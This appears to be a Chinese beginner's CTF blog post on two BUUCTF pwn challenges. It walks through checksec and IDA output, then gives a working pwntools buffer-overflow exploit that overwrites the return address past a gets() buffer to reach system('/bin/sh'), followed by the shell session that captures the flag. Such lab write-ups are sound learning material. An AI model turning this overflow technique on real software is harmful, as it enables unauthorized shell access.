---
title: 【CTF】pwn学习之路
date: 2025-05-21
description: 小白初试pwn，会学会吗。。
slug: pwnpwnpwn
image: cover.jpg
tag: 
    - CTF
    - 网络安全
    - pwn
    - 逆向
categories: 
    - 网络安全

---

初学者。。用于记录学习过程与笔记。

## test_your_nc

先用`checksec`检查下：

![checksec1](1-1.png)

1. **RELRO**  
   `Partial` → GOT 表可写（易被 `GOT overwrite` 攻击）。`Full` 时 GOT 只读更安全。

2. **STACK CANARY**  
   `未启用` → 栈溢出无检测，可直接覆盖返回地址。启用后栈破坏会崩溃。

3. **NX**  
   `开启` → 栈/堆不可执行。

4. **PIE**  
   `开启` → 代码地址随机化，需泄露地址。关闭则地址固定。

5. **RPATH/RUNPATH**  
   `未设置` → 无额外库路径，降低劫持风险。

6. **Symbols**  
   `64` → 保留符号（函数名等），易逆向分析。

7. **FORTIFY**  
   `未启用` → 无堆栈保护。

再拖到`IDA Pro`里看看:

![ida1](1-2.png)

````c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  system("/bin/sh");
  return 0;
}
````

直接调用`system()`函数进入shell，所以直接使用`netcat`连接靶机：

````bash
nc ip port
````

![nc1](1-3.png)

发现直接连接上了，根目录就有flag，得到：`flag{b6588539-d35f-4fde-b2b9-8c56d7fb66bd}`

## rip

`checksec`分析：

````bash
❯ checksec --file=./pwn1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable   FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   64 Symbols        No    0               1    ./pwn1

````

`IDA Pro`分析主函数：

````c

int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[15]; // [rsp+1h] [rbp-Fh] BYREF

  puts("please input");
  gets(s, argv);
  puts(s);
  puts("ok,bye!!!");
  return 0;
}
````

同时注意到`fun()`函数：

````c
int fun()
{
  return system("/bin/sh");
}
````

`gets()`函数不检查输入长度，所以可利用其来溢出`s`，到达shellcode也就是`fun()`。

````asm
.text:0000000000401186
.text:0000000000401186 ; Attributes: bp-based frame
.text:0000000000401186
.text:0000000000401186 ; int fun()
.text:0000000000401186                 public fun
.text:0000000000401186 fun             proc near
.text:0000000000401186 ; __unwind {
.text:0000000000401186                 push    rbp
.text:0000000000401187                 mov     rbp, rsp
.text:000000000040118A                 lea     rdi, command    ; "/bin/sh"
.text:0000000000401191                 call    _system
.text:0000000000401196                 nop
.text:0000000000401197                 pop     rbp
.text:0000000000401198                 retn
.text:0000000000401198 ; } // starts at 401186
.text:0000000000401198 fun             endp
````

注意到shellcode位于`40118A`，所以我们要让其执行这个地址的命令。

那么如何溢出呢？首先要填满`s[15]`，也就是15个字节，与此同时，还需要添加8个字节来顶掉保存字节`push rbp;`：

> 每个函数调用都会在栈上保存前一个函数的RBP值
> 这个保存操作占用固定的8字节空间
> 在缓冲区溢出攻击中，这8字节是覆盖返回地址前必须越过的最后一个屏障
> x86架构是4字节，x64架构是8字节 → 这是64位系统的关键特征

所以构建payload：

````python
payload = b'q'*23 + p64(0x40118A)
````

先发送23个q使其溢出，后面接上shellcode`fun()`中终端函数的地址，尝试进入shell。


> `p64()` 是 Python 中 **pwntools** 库的核心函数，用于将整数转换为**64位小端序字节序列**。在 pwn 漏洞利用中，它用于精确构造内存地址格式的 payload。

最终程序：

````python
from pwn import *

host = "node5.buuoj.cn"
port = 25983
sh = remote(host, port)
payload = b'q'*23 + p64(0x40118A)
sh.sendline(payload)
sh.interactive()
````

详解：

新建一个`sh`对象，用于连接靶机以及操作靶机；

> **remote()函数**：pwntools的核心函数，用于创建TCP连接

`sendline()`向靶机发送payload;

> **sendline()**：发送数据并在末尾自动添加 `\n`（0x0A）
> 重要：因为原程序使用 `gets()` 函数，该函数以 `\n` 或 EOF 为结束标志

**发送内容**：

````
qqqqqqqqqqqqqqqqqqqqqqq + \x8A\x11\x40\x00\x00\x00\x00\x00 + \n
````

执行，获取到了shell，获得flag：

````
PS C:\Users\root> & "D:/Program Files/python/python.exe" d:/CTF/项目/BUU/pwn/rip/hack.py
[x] Opening connection to node5.buuoj.cn on port 25983
[x] Opening connection to node5.buuoj.cn on port 25983: Trying 117.21.200.176
[+] Opening connection to node5.buuoj.cn on port 25983: Done
[*] Switching to interactive mode
ls

bin
boot
dev
etc
flag
home
...
var
cat flag
`flag{7f35d897-a5fd-4505-84a7-2990b740f2d9}`
````